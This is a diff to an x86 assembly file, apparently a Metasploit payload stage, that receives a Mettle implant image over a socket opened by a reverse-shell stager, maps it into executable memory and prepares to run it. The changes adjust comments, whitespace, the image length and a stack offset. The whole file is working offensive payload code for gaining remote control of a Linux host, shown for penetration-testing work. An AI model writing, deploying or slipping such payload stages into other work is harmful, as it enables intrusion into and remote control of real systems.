@@ -1,7 +1,7 @@
 ; stage_mettle_x86.asm
 ; rough draft, i'd be very surprised if it compiles
-; syscall # in eax
-; ebx, ecx, edx, esi, edi, ebp
+;
+; - bill
 
 BITS 32
 
@@ -11,17 +11,17 @@ section .text
 
 _start:
   ; socket fd from stager_sock_reverse will be in edi
-  push edi        
+  push edi
 
   ; allocate space for mettle process image
-  xor ebx, ebx    ; address
-  mov ecx, =SIZE  ; length
-  mov edx, 7      ; PROT_READ | PROT_WRITE | PROT_EXECUTE
-  mov esi, 34     ; MAP_PRIVATE | MAP_ANONYMOUS
-  xor edi, edi    ; fd
-  xor ebp, ebp    ; pgoffset
-  mov eax, 192    ; mmap2
-  int 0x80        ; syscall
+  xor ebx, ebx      ; address
+  mov ecx, 0x100d0  ; length
+  mov edx, 7        ; PROT_READ | PROT_WRITE | PROT_EXECUTE
+  mov esi, 34       ; MAP_PRIVATE | MAP_ANONYMOUS
+  xor edi, edi      ; fd
+  xor ebp, ebp      ; pgoffset
+  mov eax, 192      ; mmap2
+  int 0x80          ; syscall
 
   ; recv mettle process image
   mov edx, ecx    ; ecx should still contain SIZE
@@ -46,7 +46,7 @@ _start:
 
   ; inefficient, but it's too late at night to be attempting pushad ...
   and esp, 0xfffffff0   ; align esp
-  add esp, 260          ; add esp, see adam or a debugger for explaination
+  add esp, 40           ; add esp, see adam or a debugger for explaination
   mov eax, 109
   push eax              ; "m" (0,0,0,109)
   mov eax, 2
@@ -57,7 +57,7 @@ _start:
   xor ebx, ebx
   push ebx              ; NULL
   push ebx              ; NULL
-  mov eax, 7 
+  mov eax, 7
   push eax              ; AT_BASE
   push ecx              ; mmap'd address (is ecx still preserved here?)
   push ebx              ; AT_NULL
